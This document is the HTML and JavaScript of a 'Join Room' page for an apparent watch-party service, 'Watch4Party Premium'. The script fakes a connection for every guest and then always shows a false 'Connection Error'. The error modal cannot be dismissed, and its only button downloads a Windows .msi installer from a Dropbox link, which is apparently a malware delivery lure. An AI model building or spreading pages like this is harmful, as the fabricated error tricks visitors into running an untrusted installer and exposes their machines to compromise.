<!DOCTYPE html>
<html lang="en" data-theme="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Room - Watch4Party Premium</title>
    <link rel="canonical" href="index.htm">
    <link rel="icon" type="image/png" href="../img/hero-logo-1.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="../style-1.css">
</head>

<body>
    <div class="auth-container">
        <div class="auth-card">
            <h2 class="auth-title">Enter Room</h2>
            <p class="auth-subtitle">Join the watch party as a guest</p>

            <div id="guest-form">
                <div class="form-group">
                    <label class="form-label" for="guest-name">Display Name</label>
                    <input type="text" id="guest-name" class="form-input" placeholder="Guest_123">
                </div>

                <div class="form-group">
                    <label class="form-label">Choose Avatar</label>
                    <div class="avatar-grid" style="display: flex; gap: 10px; justify-content: center; margin-bottom: 1rem;">
                        <!-- Avatars will be injected here -->
                    </div>
                </div>
                <style>
                    .avatar-option {
                        width: 45px;
                        height: 45px;
                        border-radius: 50%;
                        border: 2px solid var(--card-border);
                        cursor: pointer;
                        transition: all 0.2s;
                        opacity: 0.7;
                    }

                    .avatar-option:hover {
                        transform: scale(1.1);
                        opacity: 1;
                    }

                    .avatar-option.selected {
                        border-color: var(--accent-red);
                        opacity: 1;
                        box-shadow: 0 0 10px rgba(229, 9, 20, 0.4);
                        transform: scale(1.1);
                    }
                </style>
                <button id="btn-guest" class="btn btn-primary" style="width: 100%;">Continue as Guest</button>
            </div>

            <div class="auth-footer" style="margin-top: 1rem;">
                <a href="../index-1.htm" style="color: var(--text-secondary); font-size: 0.8rem;">
                    <i class="fa-solid fa-arrow-left"></i> Back to Home
                </a>
            </div>
        </div>
    </div>

    <!-- Error/Redirect Modal -->
    <div id="errorModal" class="modal-overlay" style="display: none; opacity: 0;">
        <div class="modal-content">
            <div class="modal-icon" style="background: rgba(229, 9, 20, 0.1); color: var(--accent-red); border-color: rgba(229, 9, 20, 0.3);">
                <i class="fa-solid fa-triangle-exclamation"></i>
            </div>
            <h3>Connection Error</h3>
            <p>The web player is currently at capacity or your browser does not support the required codecs for this
                room.</p>
            <p style="font-size: 0.9em; color: var(--text-secondary);">Please download the desktop app for a stable
                experience.</p>
            <div class="modal-actions">
                <button class="btn btn-premium-glow" id="btn-download-redirect">
                    <i class="fa-brands fa-windows" style="margin-right: 8px;"></i> Download App
                </button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const btnGuest = document.getElementById('btn-guest');
            const guestNameInput = document.getElementById('guest-name');
            const errorModal = document.getElementById('errorModal');
            const btnDownload = document.getElementById('btn-download-redirect');
            const downloadLink = "https://www.dropbox.com/scl/fi/keexp2t1s0a6epehhit0y/Watch4Party-Setup.msi?rlkey=aetnt5u4l7akzd59py3pu07n3&st=1s2jgvk2&dl=1";

            // Avatar Logic
            const seeds = ['Felix', 'Aneka', 'Zoe', 'Max', 'Luna'];
            const avatarGrid = document.querySelector('.avatar-grid');
            let selectedAvatar = null;

            seeds.forEach((seed, index) => {
                const img = document.createElement('img');
                img.src = `https://api.dicebear.com/9.x/avataaars/svg?seed=${seed}`;
                img.className = 'avatar-option';
                if (index === 0) { // Select first by default
                    img.classList.add('selected');
                    selectedAvatar = seed;
                }
                img.onclick = () => {
                    document.querySelectorAll('.avatar-option').forEach(el => el.classList.remove('selected'));
                    img.classList.add('selected');
                    selectedAvatar = seed;
                };
                avatarGrid.appendChild(img);
            });

            btnGuest.addEventListener('click', () => {
                // Simulate loading
                const originalText = btnGuest.innerHTML;
                btnGuest.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
                btnGuest.disabled = true;

                setTimeout(() => {
                    // Show error modal
                    errorModal.style.display = 'flex';
                    // Trigger reflow
                    errorModal.offsetHeight;
                    errorModal.classList.add('active');
                    errorModal.style.opacity = '1';

                    // Reset button
                    btnGuest.innerHTML = originalText;
                    btnGuest.disabled = false;
                }, 1500);
            });

            btnDownload.addEventListener('click', () => {
                // Change button text to indicate processing
                const oldText = btnDownload.innerHTML;
                btnDownload.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Starting...';
                window.location.href = downloadLink;
            });

            // Close modal on outside click (optional, but forces download)
            errorModal.addEventListener('click', (e) => {
                if (e.target === errorModal) {
                    // Optional: close or shake to indicate required
                }
            });
        });
    </script>
<script defer="" src="../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"ae63f417532147d68913bc8e1155ad01","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

</html>





